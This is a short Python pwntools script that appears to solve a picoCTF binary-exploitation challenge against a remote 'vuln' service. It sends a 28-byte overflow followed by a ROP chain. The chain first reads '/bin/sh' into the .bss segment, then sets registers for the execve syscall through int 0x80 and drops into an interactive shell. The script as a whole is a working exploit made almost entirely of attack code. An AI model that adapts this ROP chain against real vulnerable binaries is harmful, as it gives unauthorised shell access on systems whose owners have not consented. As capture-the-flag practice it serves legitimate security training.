from pwn import *
context.log_level = 'debug'

# io = process('./vuln')
io = remote('saturn.picoctf.net', 53996)
elf = ELF('./vuln')

sh_addr = next(elf.search(b'sh\0'))		# 'sh' addr, need to make ebx point to it
sys_execve = 0xb						# need to make eax be 0xb

pop_eax_addr = 0x80b074a
pop_ebx_addr = 0x8049022
pop_ecx_addr = 0x8049e39
pop_edx_ebx_addr = 0x80583c9
int_80_addr = 0x804a3d2
read_addr = 0x806ecf0
vuln_addr = 0x8049d95
bss_addr = 0x80e62f0

# Step 1: read '/bin/sh' into bss segment and return to vuln() function
payload = cyclic(28)
payload += p32(read_addr) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)

io.sendlineafter(b'grasshopper!', payload)

payload = b'/bin/sh\x00'
io.sendline(payload)

# Step 2: use 'int 80' to call SYS_execve, set argument as:
# eax = 0xb
# ebx = '/bin/sh' address
# ecx = edx = 0
payload = cyclic(28)
payload += p32(pop_eax_addr) + p32(0xb)
payload += p32(pop_edx_ebx_addr) + p32(0) + p32(bss_addr)
payload += p32(pop_ecx_addr) + p32(0)
payload += p32(int_80_addr)

io.sendlineafter(b'grasshopper!', payload)

io.interactive()